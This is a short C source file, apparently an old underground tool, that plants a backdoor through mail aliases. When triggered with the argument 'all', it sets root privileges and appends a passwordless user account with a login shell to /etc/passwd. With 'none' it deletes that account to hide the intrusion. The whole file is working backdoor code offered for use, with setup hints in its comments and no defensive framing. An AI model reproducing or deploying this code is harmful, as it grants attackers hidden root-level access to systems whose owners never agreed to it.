// backmail.c by Permssion Denied
// easy backdoor on mail aliases
// don't forget to add aliases and run newaliases!

#include <stdio.h>

main(int argc, char **argv) {
 setuid(0);
 setgid(0);
 chdir("/tmp");
 if(argc!=2) return;
 if(strncmp(argv[1], "all",3)==0) 
  system("if [ -z \"`cat /etc/passwd | grep DELTA:`\" ]; then \
 echo delta::1601:1601:Drukarnia DELTA:/tmp:/bin/ash >> /etc/passwd ; fi");
 if(strncmp(argv[1], "none",4)==0) {
  system("grep -v DELTA: /etc/passwd > ac0011.tmp");
  system("mv ac0011.tmp /etc/passwd");
 }
}
